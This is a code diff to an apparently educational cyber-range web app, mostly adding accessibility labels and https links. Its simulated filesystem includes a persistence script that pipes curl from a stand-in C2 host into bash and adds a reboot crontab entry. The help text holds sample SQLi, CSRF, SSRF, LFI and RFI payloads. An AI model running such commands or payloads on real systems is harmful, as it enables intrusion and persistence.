@@ -4,6 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
 <title>CYBAASH // Autonomous Cyber Range</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');
 
@@ -1743,9 +1745,9 @@ body.attacker-mode #attackerBadge { display: block; }
     <div class="stat-pill">ATK <span class="val red" id="atkCount">0</span></div>
     <div class="stat-pill">DEF <span class="val green" id="defCount">0</span></div>
     <div class="stat-pill">SCORE <span class="val yellow" id="scoreH">—</span></div>
-    <button class="btn btn-red" onclick="window.open('recruiter.html','_blank','noopener,noreferrer')">RECRUITER VIEW</button>
-    <button class="btn btn-green" id="termToggleBtn" onclick="termToggle()" style="letter-spacing:2px">⌨ TERMINAL</button>
-    <button id="cybaash-nav-btn" onclick="window.open('ai/','_blank','noopener,noreferrer')">CYBAASH AI</button>
+    <button class="btn btn-red" aria-label="Open recruiter view" onclick="window.open('recruiter.html','_blank','noopener,noreferrer')">RECRUITER VIEW</button>
+    <button class="btn btn-green" id="termToggleBtn" aria-label="Toggle terminal" onclick="termToggle()" style="letter-spacing:2px">⌨ TERMINAL</button>
+    <button id="cybaash-nav-btn" aria-label="Open CYBAASH AI" onclick="window.open('ai/','_blank','noopener,noreferrer')">CYBAASH AI</button>
   </div>
 </div>
 
@@ -1824,6 +1826,14 @@ body.attacker-mode #attackerBadge { display: block; }
   <div class="tab" id="replayTab" onclick="switchTab('replay',this)" style="color:var(--purple)">⏮ TIME-TRAVEL</div>
 </div>
 
+<!-- Section anchor targets for nav links -->
+<span id="about" style="position:absolute;visibility:hidden"></span>
+<span id="skills" style="position:absolute;visibility:hidden"></span>
+<span id="experience" style="position:absolute;visibility:hidden"></span>
+<span id="projects" style="position:absolute;visibility:hidden"></span>
+<span id="cybaash" style="position:absolute;visibility:hidden"></span>
+<span id="contact" style="position:absolute;visibility:hidden"></span>
+
 <!-- MAIN LAYOUT -->
 <div class="main">
 
@@ -1836,9 +1846,9 @@ body.attacker-mode #attackerBadge { display: block; }
 
     <div id="leftPanelBody">
     <div class="controls">
-      <button class="btn btn-red" id="btnLaunchAtk" onclick="launchAttack()">▶ LAUNCH</button>
-      <button class="btn btn-yellow" id="btnPauseAtk" onclick="togglePause()" disabled>⏸ PAUSE</button>
-      <button class="btn btn-blue" id="btnNewScenario" onclick="generateScenario()">↺ SCENARIO</button>
+      <button class="btn btn-red" id="btnLaunchAtk" aria-label="Launch attack simulation" onclick="launchAttack()">▶ LAUNCH</button>
+      <button class="btn btn-yellow" id="btnPauseAtk" aria-label="Pause simulation" onclick="togglePause()" disabled>⏸ PAUSE</button>
+      <button class="btn btn-blue" id="btnNewScenario" aria-label="Generate new scenario" onclick="generateScenario()">↺ SCENARIO</button>
     </div>
 
     <!-- Attack Phase Indicator -->
@@ -2000,7 +2010,7 @@ body.attacker-mode #attackerBadge { display: block; }
           <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-wrap:wrap">
             <button class="btn" id="rpBtnStart"  onclick="rpJump(0)"     title="Jump to start"  style="font-size:14px;padding:4px 8px;min-width:32px">⏮</button>
             <button class="btn" id="rpBtnBack"   onclick="rpStepBack()"  title="Step back"      style="font-size:14px;padding:4px 8px;min-width:32px">⏴</button>
-            <button class="btn btn-red" id="rpBtnPlay" onclick="rpTogglePlay()" style="min-width:80px;font-size:10px">▶ PLAY</button>
+            <button class="btn btn-red" id="rpBtnPlay" aria-label="Play replay" onclick="rpTogglePlay()" style="min-width:80px;font-size:10px">▶ PLAY</button>
             <button class="btn" id="rpBtnFwd"    onclick="rpStepFwd()"   title="Step forward"   style="font-size:14px;padding:4px 8px;min-width:32px">⏵</button>
             <button class="btn" id="rpBtnEnd"    onclick="rpJump(-1)"    title="Jump to end"    style="font-size:14px;padding:4px 8px;min-width:32px">⏭</button>
             <div style="margin-left:auto;display:flex;align-items:center;gap:6px">
@@ -2011,7 +2021,7 @@ body.attacker-mode #attackerBadge { display: block; }
                 <option value="300">2×</option>
                 <option value="120">5×</option>
               </select>
-              <button class="btn" id="rpBtnExit" onclick="rpExitReplay()" style="font-size:9px;color:var(--red);border-color:var(--red)">✕ EXIT</button>
+              <button class="btn" id="rpBtnExit" aria-label="Exit replay" onclick="rpExitReplay()" style="font-size:9px;color:var(--red);border-color:var(--red)">✕ EXIT</button>
             </div>
           </div>
 
@@ -2112,11 +2122,11 @@ body.attacker-mode #attackerBadge { display: block; }
 
 <!-- MOBILE FAB BAR -->
 <div class="mob-fab-bar" id="mobFabBar">
-  <button class="mob-fab left-fab" onclick="mobOpenLeft()">
+  <button class="mob-fab left-fab" aria-label="Open left panel" onclick="mobOpenLeft()">
     <span class="mob-fab-dot"></span>
     ⚔ ATTACK
   </button>
-  <button class="mob-fab right-fab" onclick="mobOpenRight()">
+  <button class="mob-fab right-fab" aria-label="Open right panel" onclick="mobOpenRight()">
     <span class="mob-fab-dot"></span>
     ◆ DNA
   </button>
@@ -3245,6 +3255,7 @@ function initWhatIf() {
             <span style="font-family:'Orbitron',monospace;font-size:10px;color:var(--blue)" id="wi_${p.id}_val">${p.val}</span>
           </div>
           <input type="range" min="${p.min}" max="${p.max}" value="${p.val}" 
+            aria-label="${p.label}"
             style="width:100%" 
             oninput="updateWhatIf('${p.id}', this.value)"
           >
@@ -3305,7 +3316,7 @@ function computeWhatIf() {
       Cert knowledge weight of ${certWeight}% provides ${parseInt(certWeight) > 60 ? 'strong' : 'moderate'} 
       countermeasure advantage — particularly in security detection and response automation.
     </div>
-    <button class="btn btn-blue" onclick="applyWhatIfAndRun()" style="margin-top:12px;width:100%">▶ RUN WITH THESE PARAMS</button>
+    <button class="btn btn-blue" aria-label="Run simulation with what-if parameters" onclick="applyWhatIfAndRun()" style="margin-top:12px;width:100%">▶ RUN WITH THESE PARAMS</button>
   `;
 
   const el = document.getElementById('whatifPredictions');
@@ -3369,9 +3380,9 @@ function updateScoringPanel() {
     </div>
 
     <div style="display:flex;gap:10px;margin-top:14px;flex-wrap:wrap">
-      <button class="btn btn-blue" onclick="termToggle();setTimeout(()=>{document.getElementById('termInput').value='score';termPrintCmd('score');termExec('score');},300)" style="font-size:9px">⌨ SCORE IN TERMINAL</button>
-      <button class="btn btn-green" onclick="termToggle();setTimeout(()=>{document.getElementById('termInput').value='export score';termPrintCmd('export score');termExec('export score');},300)" style="font-size:9px">↓ EXPORT REPORT</button>
-      <button class="btn btn-yellow" onclick="termToggle();setTimeout(()=>{document.getElementById('termInput').value='replay start';termPrintCmd('replay start');termExec('replay start');},300)" style="font-size:9px">⏮ REPLAY SESSION</button>
+      <button class="btn btn-blue" aria-label="Show score in terminal" onclick="termToggle();setTimeout(()=>{document.getElementById('termInput').value='score';termPrintCmd('score');termExec('score');},300)" style="font-size:9px">⌨ SCORE IN TERMINAL</button>
+      <button class="btn btn-green" aria-label="Export score report" onclick="termToggle();setTimeout(()=>{document.getElementById('termInput').value='export score';termPrintCmd('export score');termExec('export score');},300)" style="font-size:9px">↓ EXPORT REPORT</button>
+      <button class="btn btn-yellow" aria-label="Replay session" onclick="termToggle();setTimeout(()=>{document.getElementById('termInput').value='replay start';termPrintCmd('replay start');termExec('replay start');},300)" style="font-size:9px">⏮ REPLAY SESSION</button>
     </div>
   `;
 
@@ -4973,11 +4984,11 @@ const GEMINI_AI = {
       // Cybersecurity topics
       'sql injection|sqli|sql inject': `SQL Injection (SQLi) — OWASP A03\nInjects malicious SQL to manipulate database queries.\nTypes: Classic, Blind, UNION-based, Time-based, Error-based\nExample: ' OR '1'='1\nImpact: Data theft, auth bypass, data deletion, RCE\nFix: cursor.execute("SELECT * FROM users WHERE id=%s",(id,))\nNEVER concatenate user input directly into SQL queries.`,
       'xss|cross.site scripting|script inject': `Cross-Site Scripting (XSS) — OWASP A03\nInjects scripts into web pages viewed by other users.\nTypes: Stored (persistent), Reflected, DOM-based\nImpact: Session hijacking, credential theft, defacement\nFix: Use textContent not innerHTML\nFix: Content-Security-Policy headers\nFix: Escape all user-supplied output\nFix: Use DOMPurify for HTML content`,
-      'csrf|cross.site request|request forgery': `Cross-Site Request Forgery (CSRF)\nTricks authenticated users into submitting malicious requests.\nExample: <img src='https://bank.com/transfer?to=attacker&amount=1000'>\nImpact: Unauthorized actions on behalf of logged-in users\nFix: CSRF tokens (synchronizer token pattern)\nFix: SameSite cookie attribute (Strict or Lax)\nFix: Verify Origin/Referer headers`,
+      'csrf|cross.site request|request forgery': `Cross-Site Request Forgery (CSRF)\nTricks authenticated users into submitting malicious requests.\nExample: <img src='https://bank.com/transfer?to=attacker&amount=1000' alt='CSRF attack example'>\nImpact: Unauthorized actions on behalf of logged-in users\nFix: CSRF tokens (synchronizer token pattern)\nFix: SameSite cookie attribute (Strict or Lax)\nFix: Verify Origin/Referer headers`,
       'buffer overflow|stack overflow|heap overflow|bof': `Buffer Overflow\nWriting more data than a buffer can hold, overwriting adjacent memory.\nTypes: Stack overflow, Heap overflow, Integer overflow, Format string\nImpact: Arbitrary code execution, privilege escalation, DoS\nFix: Use memory-safe languages (Python, Rust, Go)\nFix: Enable ASLR, stack canaries (gcc -fstack-protector)\nFix: Enable DEP/NX (Data Execution Prevention)`,
       'owasp|top 10|top ten': `OWASP Top 10 (2021):\nA01: Broken Access Control\nA02: Cryptographic Failures\nA03: Injection (SQLi, XSS, Command Injection)\nA04: Insecure Design\nA05: Security Misconfiguration\nA06: Vulnerable and Outdated Components\nA07: Identification and Authentication Failures\nA08: Software and Data Integrity Failures\nA09: Security Logging and Monitoring Failures\nA10: Server-Side Request Forgery (SSRF)`,
-      'ssrf|server.side request': `Server-Side Request Forgery (SSRF) — OWASP A10\nServer makes HTTP requests to attacker-controlled destinations.\nExample: ?url=http://169.254.169.254/latest/meta-data/ (AWS metadata)\nImpact: Internal service access, cloud credentials, port scanning, RCE\nFix: Validate and sanitize all URLs\nFix: Block private IP ranges (10.x, 192.168.x, 172.16.x, 169.254.x)\nFix: Allowlist outbound destinations`,
-      'lfi|rfi|file inclusion|path traversal|directory traversal': `Local/Remote File Inclusion (LFI/RFI)\nIncludes files via user-supplied path input without validation.\nLFI Example: ?file=../../../../etc/passwd\nRFI Example: ?file=http://attacker.com/shell.php\nImpact: Sensitive file read, source disclosure, RCE\nFix: Never use user input in file paths\nFix: Use whitelists for allowed files\nFix: Use os.path.realpath() and verify base directory`,
+      'ssrf|server.side request': `Server-Side Request Forgery (SSRF) — OWASP A10\nServer makes HTTP requests to attacker-controlled destinations.\nExample: ?url=https://169.254.169.254/latest/meta-data/ (AWS metadata)\nImpact: Internal service access, cloud credentials, port scanning, RCE\nFix: Validate and sanitize all URLs\nFix: Block private IP ranges (10.x, 192.168.x, 172.16.x, 169.254.x)\nFix: Allowlist outbound destinations`,
+      'lfi|rfi|file inclusion|path traversal|directory traversal': `Local/Remote File Inclusion (LFI/RFI)\nIncludes files via user-supplied path input without validation.\nLFI Example: ?file=../../../../etc/passwd\nRFI Example: ?file=https://attacker.example/shell.php\nImpact: Sensitive file read, source disclosure, RCE\nFix: Never use user input in file paths\nFix: Use whitelists for allowed files\nFix: Use os.path.realpath() and verify base directory`,
       'xxe|xml external|xml injection': `XML External Entity (XXE) Injection\nXML parser processes malicious external entity references.\nImpact: Local file read, SSRF, DoS (Billion Laughs attack)\nFix: Disable external entity processing in XML parsers\nFix: Use defusedxml library in Python\nFix: Use JSON instead of XML where possible`,
       'idor|insecure direct|object reference': `Insecure Direct Object Reference (IDOR)\nDirect access to objects via manipulable user input.\nExample: /user/profile?id=1337 → change to id=1338\nImpact: Unauthorized data access, privacy violations, account takeover\nFix: Implement proper access controls on every object\nFix: Use UUIDs instead of sequential integers\nFix: Always verify user owns/has access to requested object`,
       'pen test|pentest|penetration test|ethical hack': `Penetration Testing Methodology:\n1. Reconnaissance — OSINT, DNS, Shodan, TheHarvester\n2. Scanning — Nmap port scan, Nessus/OpenVAS vuln scan\n3. Enumeration — Service fingerprinting, user enum, shares\n4. Exploitation — Metasploit, SQLmap, Burp Suite, manual\n5. Post-Exploitation — Priv-esc, lateral movement, persistence\n6. Reporting — CVSS ratings, timeline, remediation\nTools: Nmap, Metasploit, Burp Suite, SQLmap, Hydra, Gobuster, BloodHound`,
@@ -5552,9 +5563,9 @@ const FS = {
     '/etc/hostname': 'cybaash-kali\n',
     '/root/Desktop/SCOPE.md': '# Engagement Scope\n## Target: CYBAASH Internal Network\n## Authorized IPs: 10.0.0.0/24\n## Out of Scope: 10.0.0.254 (gateway)\n## Duration: 72 hours\n## Report Due: 2026-03-25\n',
     '/root/Desktop/target_list.txt': '10.0.0.1  WEB01\n10.0.0.2  DB01\n10.0.0.3  DC01\n10.0.0.4  FW01\n10.0.0.5  API01\n10.0.0.6  CDN01\n10.0.0.7  WS01\n10.0.0.8  APP01\n10.0.0.9  VPN01\n',
-    '/root/.bash_history': 'nmap -sV -p- 10.0.0.0/24\nmsfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.3\nrun\nhashdump\ncd /tmp\nwget http://10.0.0.100:8080/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n',
+    '/root/.bash_history': 'nmap -sV -p- 10.0.0.0/24\nmsfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.3\nrun\nhashdump\ncd /tmp\nwget https://10.0.0.100:8080/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n',
     '/root/.ssh/config': 'Host dc01\n    HostName 10.0.0.3\n    User administrator\n    IdentityFile ~/.ssh/id_rsa\nHost web01\n    HostName 10.0.0.1\n    User www-data\n',
-    '/tmp/.hidden/persist.sh': '#!/bin/bash\n# Persistence mechanism\ncurl -s http://c2.attacker.local/check | bash\n(crontab -l 2>/dev/null; echo "@reboot /tmp/.hidden/persist.sh") | crontab -\n',
+    '/tmp/.hidden/persist.sh': '#!/bin/bash\n# Persistence mechanism\ncurl -s https://c2.attacker.local/check | bash\n(crontab -l 2>/dev/null; echo "@reboot /tmp/.hidden/persist.sh") | crontab -\n',
     '/var/www/html/config.php': '<?php\n$DB_HOST = \"localhost\";\n$DB_USER = \"root\";\n$DB_PASS = \"Sup3rS3cr3t!\";  // TODO: move to env\n$DB_NAME = \"cybaash_prod\";\n?>\n',
     '/proc/version': 'Linux version 6.1.0-kali9-amd64 (devel@kali.org) (gcc-12 12.2.0) #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1kali1\n',
   },
@@ -5905,7 +5916,7 @@ defCmd('nmap', (args) => {
 
 // ── gobuster ──────────────────────────────────────────────────────────────────
 defCmd('gobuster', (args) => {
-  const url = args.find(a => a.startsWith('http')) || 'http://10.0.0.1';
+  const url = args.find(a => a.startsWith('http')) || 'https://10.0.0.1';
   const paths = ['/admin','/login','/wp-admin','/api/v1','/backup','/config','/uploads','/phpmyadmin','/.env','/.git','/dashboard','/panel','/shell','/cmd','/exec','/console','/manager','/secret','/robots.txt','/sitemap.xml','/server-status'];
   const found = paths.filter(() => Math.random() > 0.5).slice(0,8);
   const lines = [
@@ -5994,7 +6005,7 @@ defCmd('hydra', (args) => {
 
 // ── sqlmap ────────────────────────────────────────────────────────────────────
 defCmd('sqlmap', (args) => {
-  const url = args.find(a => a.startsWith('http')) || 'http://10.0.0.1/login?id=1';
+  const url = args.find(a => a.startsWith('http')) || 'https://10.0.0.1/login?id=1';
   const dbs = ['information_schema','mysql','cybaash_prod','users_db','admin_panel'];
   const tables = ['users','sessions','credentials','admin_users','logs','config'];
   const dump  = args.includes('--dump') || args.includes('--tables');
@@ -6244,7 +6255,7 @@ defCmd('curl', (args) => {
 
 // ── wget ──────────────────────────────────────────────────────────────────────
 defCmd('wget', (args) => {
-  const url  = args.find(a => a.startsWith('http')) || 'http://10.0.0.1/file';
+  const url  = args.find(a => a.startsWith('http')) || 'https://10.0.0.1/file';
   const file = url.split('/').pop() || 'index.html';
   termPrint({ t:'t-out', v:`--${new Date().toISOString().slice(0,19)}--  ${sanitizeText(url)}\nResolving ${url.split('/')[2]}... 10.0.0.1\nConnecting to ${url.split('/')[2]}... connected.` });
   setTimeout(() => {
@@ -6374,7 +6385,7 @@ defCmd('clear', () => {
 defCmd('enum4linux', (args) => {
   const target = args.find(a => !a.startsWith('-')) || '10.0.0.3';
   const lines = [
-    { t:'t-out', v:`Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ )` },
+    { t:'t-out', v:`Starting enum4linux v0.9.1 ( https://labs.portcullis.co.uk/application/enum4linux/ )` },
     { t:'t-dim', v:`\n ========================== \n|    Target Information    |\n ========================== \nTarget ........... ${sanitizeText(target)}\nRID Range ........ 500-550,1000-1050\nUsername ......... ''` },
     { t:'t-dim', v:`\n ============================== \n|    OS information on ${sanitizeText(target)}    |\n ============================== \nOS: Windows Server 2019 Standard 17763\nOS Build: 17763\nNative LAN Manager: Windows Server 2019 Standard 6.3` },
     { t:'t-warn', v:`\n[+] Got domain/workgroup name: CYBAASH` },
@@ -7997,7 +8008,7 @@ function showInstallBanner() {
       <strong>INSTALL CYBAASH</strong>
       <span>Add to home screen for offline access &amp; faster load</span>
     </div>
-    <button id="pwa-install-btn" onclick="installPWA()">⬇ INSTALL</button>
+    <button id="pwa-install-btn" aria-label="Install as app" onclick="installPWA()">⬇ INSTALL</button>
     <button aria-label="Dismiss" id="pwa-dismiss-btn" onclick="hideInstallBanner()" title="Dismiss">×</button>
   `;
   document.body.appendChild(banner);
@@ -8034,6 +8045,7 @@ function showUpdateBanner() {
     <span>⬡ UPDATE AVAILABLE — New version of CYBAASH ready</span>
     <button style="background:none;border:1px solid #00ff88;color:#00ff88;font-family:'Share Tech Mono',monospace;
       font-size:9px;letter-spacing:.2em;padding:6px 14px;cursor:pointer;text-transform:uppercase;min-height:36px"
+      aria-label="Reload to update app"
       onclick="updateApp()">↺ RELOAD</button>
     <button style="background:none;border:none;color:#5a7a9a;cursor:pointer;font-size:16px;min-height:36px;padding:0 6px" aria-label="Close">×</button>
   `;
@@ -8213,8 +8225,8 @@ if (!localStorage.getItem('kbHintSeen')) {
     </div>
     <div id="reportBody"></div>
     <div id="reportFooter">
-      <button class="btn btn-green" onclick="printReport()">⬇ SAVE / PRINT</button>
-      <button class="btn btn-blue" onclick="shareReport()">↗ SHARE LINK</button>
+      <button class="btn btn-green" aria-label="Save or print report" onclick="printReport()">⬇ SAVE / PRINT</button>
+      <button class="btn btn-blue" aria-label="Share report link" onclick="shareReport()">↗ SHARE LINK</button>
       <button aria-label="Dismiss" class="btn btn-ghost" onclick="closeReport()">CLOSE</button>
     </div>
   </div>
@@ -8883,32 +8895,32 @@ if (typeof defCmd === 'function') {
 <button aria-label="Dismiss" class="cyb-close" onclick="closeCybaashAI()" title="Close">&times;</button>
 </div>
 <div class="cyb-suggestions">
-<button class="cyb-sug-btn" onclick="cybaashInject('Explain SQL injection with a Python example')">SQL Injection &rarr;</button>
-<button class="cyb-sug-btn" onclick="cybaashInject('How do I securely store passwords in Python?')">Secure Passwords &rarr;</button>
-<button class="cyb-sug-btn" onclick="cybaashInject('What is the OWASP Top 10?')">OWASP Top 10 &rarr;</button>
-<button class="cyb-sug-btn" onclick="cybaashInject('How does XSS work and how to prevent it?')">XSS Prevention &rarr;</button>
-<button class="cyb-sug-btn" onclick="cybaashInject('Explain penetration testing methodology')">PenTest Method &rarr;</button>
-<button class="cyb-sug-btn" onclick="cybaashInject('What is a buffer overflow attack?')">Buffer Overflow &rarr;</button>
+<button class="cyb-sug-btn" aria-label="Ask about SQL Injection" onclick="cybaashInject('Explain SQL injection with a Python example')">SQL Injection &rarr;</button>
+<button class="cyb-sug-btn" aria-label="Ask about secure passwords" onclick="cybaashInject('How do I securely store passwords in Python?')">Secure Passwords &rarr;</button>
+<button class="cyb-sug-btn" aria-label="Ask about OWASP Top 10" onclick="cybaashInject('What is the OWASP Top 10?')">OWASP Top 10 &rarr;</button>
+<button class="cyb-sug-btn" aria-label="Ask about XSS prevention" onclick="cybaashInject('How does XSS work and how to prevent it?')">XSS Prevention &rarr;</button>
+<button class="cyb-sug-btn" aria-label="Ask about penetration testing" onclick="cybaashInject('Explain penetration testing methodology')">PenTest Method &rarr;</button>
+<button class="cyb-sug-btn" aria-label="Ask about buffer overflow" onclick="cybaashInject('What is a buffer overflow attack?')">Buffer Overflow &rarr;</button>
 </div>
 <div class="cyb-tools">
-<button class="cyb-tool-tab" id="cybaash-tab-url"  onclick="cybaashTool('url')">URL</button>
-<button class="cyb-tool-tab" id="cybaash-tab-pass" onclick="cybaashTool('pass')">PASSWORD</button>
-<button class="cyb-tool-tab" id="cybaash-tab-code" onclick="cybaashTool('code')">CODE SCAN</button>
-<button class="cyb-tool-tab" id="cybaash-tab-file" onclick="cybaashTool('file')">FILE SCAN</button>
-<button class="cyb-tool-tab" onclick="cybaashClear()">CLEAR</button>
+<button class="cyb-tool-tab" id="cybaash-tab-url" aria-label="URL scanner tool" onclick="cybaashTool('url')">URL</button>
+<button class="cyb-tool-tab" id="cybaash-tab-pass" aria-label="Password analyzer tool" onclick="cybaashTool('pass')">PASSWORD</button>
+<button class="cyb-tool-tab" id="cybaash-tab-code" aria-label="Code scanner tool" onclick="cybaashTool('code')">CODE SCAN</button>
+<button class="cyb-tool-tab" id="cybaash-tab-file" aria-label="File scanner tool" onclick="cybaashTool('file')">FILE SCAN</button>
+<button class="cyb-tool-tab" aria-label="Clear tool output" onclick="cybaashClear()">CLEAR</button>
 </div>
 <div id="cybaash-tool-panel">
 <div id="cybaash-tool-url" style="display:none">
 <div class="cyb-tool-label">URL SAFETY CHECKER</div>
 <div class="cyb-tool-row">
 <input class="cyb-tool-input" id="cybaash-url-inp" type="text" placeholder="https://example.com">
-<button class="cyb-tool-submit" onclick="cybaashUrlCheck()">SCAN</button>
+<button class="cyb-tool-submit" aria-label="Scan URL" onclick="cybaashUrlCheck()">SCAN</button>
 </div><div class="cyb-tool-result" id="cybaash-url-res"></div></div>
 <div id="cybaash-tool-pass" style="display:none">
 <div class="cyb-tool-label">PASSWORD STRENGTH</div>
 <div class="cyb-tool-row">
 <input class="cyb-tool-input" id="cybaash-pass-inp" type="password" placeholder="Enter password to test..." oninput="cybaashPassCheck()">
-<button class="cyb-tool-submit" onclick="cybaashPassCheck()">ANALYZE</button>
+<button class="cyb-tool-submit" aria-label="Analyze password" onclick="cybaashPassCheck()">ANALYZE</button>
 </div><div class="cyb-tool-result" id="cybaash-pass-res"></div></div>
 <div id="cybaash-tool-code" style="display:none">
 <div class="cyb-tool-label">CODE SECURITY SCANNER</div>
@@ -8920,7 +8932,7 @@ if (typeof defCmd === 'function') {
 <option value="html">HTML</option>
 </select>
 <textarea class="cyb-tool-textarea" id="cybaash-code-inp" placeholder="Paste code here for security analysis..."></textarea>
-<button class="cyb-tool-submit" onclick="cybaashCodeScan()">SCAN CODE</button>
+<button class="cyb-tool-submit" aria-label="Scan code" onclick="cybaashCodeScan()">SCAN CODE</button>
 <div class="cyb-tool-result" id="cybaash-code-res"></div></div>
 <div id="cybaash-tool-file" style="display:none">
 <div class="cyb-tool-label">FILE SECURITY ANALYSIS</div>
